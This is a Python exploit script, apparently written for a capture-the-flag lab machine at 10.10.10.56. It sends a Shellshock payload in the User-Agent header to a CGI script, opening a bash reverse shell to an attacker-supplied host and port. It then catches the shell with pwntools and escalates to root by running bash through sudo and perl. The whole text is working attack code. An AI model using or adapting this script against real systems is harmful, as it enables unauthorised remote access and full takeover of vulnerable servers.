#!/usr/bin/python3

import requests
from pwn import * # pip install pwn

# ctrl + c
def ctrl_c(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

lhost=str(input("LHOST: ").strip("\n"))
lport=str(input("LPORT: ").strip("\n"))
payload=('() { :;}; /bin/bash -i >& /dev/tcp/'+lhost+'/'+lport+' 0>&1')

def foothold():
	url = 'http://10.10.10.56/cgi-bin/user.sh'
	headers = {'User-Agent': payload}
	requests.get(url, headers=headers)
try:
    threading.Thread(target=foothold, args=()).start()
except Exception as e:
    log.error(str(e))
shell = listen(lport, timeout=150).wait_for_connection()
if shell.sock is None:
    sys.exit(1)
else:
    shell.sendline(b"sudo perl -e 'exec \"/bin/bash\"'")
    shell.interactive()